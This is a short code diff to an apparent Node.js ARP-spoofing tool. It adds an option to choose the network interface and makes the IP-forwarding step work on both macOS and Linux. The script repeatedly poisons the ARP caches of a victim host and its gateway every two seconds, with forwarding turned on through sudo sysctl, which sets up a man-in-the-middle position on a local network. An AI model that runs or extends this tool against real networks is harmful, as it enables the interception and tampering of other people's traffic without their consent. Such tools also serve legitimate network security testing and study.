@@ -23,6 +23,10 @@ if (argv.v && argv.g){
     if(ip.isPrivate(argv.v) && ip.isPrivate(argv.g)){
       // Turn IP Forwarding Off
       ip_forward(1);
+
+      if(argv.i && argv.i.length > 0){
+        arp.setInterface(argv.i);
+      }
       // Keep Poisoning every 2 seconds.
       setInterval(function(){
         arp.poison(argv.v, argv.g);
@@ -46,8 +50,15 @@ if (argv.v && argv.g){
 
 function ip_forward(x){
   x = (x>0)? 1:0;
-  (x >= 1)? console.log('Turning on IP Forwarding') : console.log('\nTurning off IP Forwarding')
-  var a = require('child_process').exec('sudo sysctl -w net.inet.ip.forwarding='+ x);
+  (x >= 1)? console.log('Turning on IP Forwarding') : console.log('\nTurning off IP Forwarding');
+  var command = "";
+  var os = require('os').platform();
+  if(os === 'darwin'){
+    command = "sudo sysctl -w net.inet.ip.forwarding=";
+  } else {
+    command = "sudo sysctl -w net.ipv4.ip_forward=";
+  }
+  var a = require('child_process').exec(command + x);
 }
 
 
